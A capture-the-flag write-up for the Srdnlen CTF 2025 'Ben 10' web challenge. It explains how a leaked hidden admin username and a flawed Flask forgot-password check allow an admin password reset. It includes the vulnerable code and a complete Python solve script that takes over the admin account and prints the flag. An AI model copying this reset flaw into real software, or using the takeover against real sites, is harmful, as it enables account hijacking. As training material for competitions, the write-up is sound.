---
date: 2025-01-20
description: Insecure password reset allows changing admin password
platform: Srdnlen CTF 2025
categories: Web
tags:
  - broken-access-control
  - insecure-design
  - code-review
  - flask
duration:
---

# Ben 10 
Ben Tennyson's Omnitrix holds a mysterious and powerful form called Materia Grigia — a creature that only those with the sharpest minds can access. It's hidden deep within the system, waiting for someone clever enough to unlock it. Only the smartest can access what’s truly hidden.

Can you outsmart the system and reveal the flag?

# Vulnerability 
## Information disclosure 
home.html - admin_username being passed
```html
    <!-- secret admin username -->
    <div style="display:none;" id="admin_data">{{ admin_username }}</div>
```
## Insecure forgot password 
```python
@app.route('/forgot_password', methods=['GET', 'POST'])
def forgot_password():
	# ... 
	username = username.split('^')[1]
	# gets reset_token for "non admin" even if admin user is specified with ^ 
	token = get_reset_token_for_user(username)
	if token and token[0] == reset_token:
		# but still updates the "admin" password from the "non admin" token
		update_password(request.form['username'], new_password)
		flash(f"Password reset successfully.", "success")
		return redirect(url_for('login'))
	else:
		flash("Invalid reset token for user.", "error")
```
> Incorrectly validates token for a regular user even if admin is specified. `admin^username^randomhex`  > will check the token for `username` but the password for admin will be one updated.


# Attack chain 
1. Register user > 1 
2. Access secret user in `/home id=admin_data`  > 2
3. Reset password (post)
 - username: (1) 
 - get strong text (token) > 3
4. Forgot password (post) 
 -  username: (2) `admin^(1)^ad3c8684d9`
 -  reset_token: (3) 
 - username updated  
5. Login as admin (2) 
6. Access. `/image/ben10` > flag

## solve.py
```python
import requests
from bs4 import BeautifulSoup


#url="http://127.0.0.1:1337"
url="http://ben10.challs.srdnlen.it:8080"

username="aadmin"
password="password"

data = {
	"username": username,
	"password" :password	
}
def register(url):
	url = url+"/register"
	resp = requests.post(url,data=data)
	if "Registration successful" in resp.text:
		print("Registered user")

def login(url, data, get_admin=True):
	s =	requests.Session()
	url = url+"/login"
	resp = s.post(url,data=data)	
	# print(resp.text)
	soup = BeautifulSoup(resp.text, 'html.parser')
	if get_admin:
		return soup.find(id="admin_data").get_text()
	else:
		return s 

# get token  
def reset_password(url,data):
	url=url+"/reset_password"
	resp = requests.post(url, data=data)	
	#print(resp.text)
	soup = BeautifulSoup(resp.text, 'html.parser')
	
	return soup.find('strong').get_text()

def forgot_password(url,admin_username, reset_token):
	url=url+"/forgot_password"
	data = {
		"username":admin_username,
		"reset_token": reset_token,
		"new_password": "password",
		"confirm_password": "password"
	}	
	resp = requests.post(url,data=data)	
	if "Password reset successfully" in resp.text:
		print(f"{admin_username} password reset to password")


def get_flag(s, url):
	url=url+"/image/ben10"
	resp = s.get(url)	
	soup = BeautifulSoup(resp.text, 'html.parser')
	return soup.find(class_="flag-container")

register(url)
print("username:", data['username'])
admin_username = login(url,data)
print("admin_username:", admin_username)
reset_token = reset_password(url,data)

print("reset_token:", reset_token)
forgot_password(url, admin_username,reset_token)

data["username"] = admin_username
s= login(url, data, get_admin=False)
flag = get_flag(s, url)

print(flag)
# srdnlen{b3n_l0v3s_br0k3n_4cc355_c0ntr0l_vulns}
```
